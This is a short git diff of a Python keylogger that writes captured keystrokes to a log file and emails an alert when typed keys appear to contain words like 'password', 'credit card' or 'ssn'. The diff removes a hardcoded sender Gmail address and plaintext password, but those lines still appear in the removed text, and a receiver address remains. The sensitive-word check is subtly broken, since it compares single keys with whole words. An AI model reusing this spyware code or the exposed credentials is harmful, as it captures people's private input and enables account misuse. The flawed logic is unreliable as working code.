@@ -23,9 +23,9 @@ sensitive_words = {"password", "credit card", "ssn", "bank", "confidential"}
 
 
 def send_alert_email(detected_word):
-    sender_email = "cbitosc24@gmail.com"
+    sender_email = ""
     receiver_email = "nithinkonda142@gmail.com"
-    password = "CBITopensource6942$"  # Use environment variables for security
+    password = ""
 
     subject = "ALERT: Sensitive Word Detected"
     body = f"The word '{detected_word}' was detected in the key logs. Please check the logs for details."
@@ -81,13 +81,17 @@ while number_of_iterations<number_of_iterations_end:
     def write_file(keys):
         with open(key_information, "a") as f:
             for key in keys:
-                k = str(key).replace("'","")
-                if k.find("space")>0:
+                key_str = str(key).replace("'", "")  # Convert key to string and clean it
+
+                if "space" in key_str:
                     f.write("\n")
-                    f.close()
-                elif k.find("Key") == -1:
-                    f.write(k)
-                    f.close()
+                elif "Key" not in key_str:  # Ignore special keys like shift, ctrl, etc.
+                    f.write(key_str)
+
+                # Check for sensitive words
+                for word in sensitive_words:
+                    if word in key_str.lower():  # Convert key_str to lowercase
+                        send_alert_email(word)
 
 
     def on_release(key):
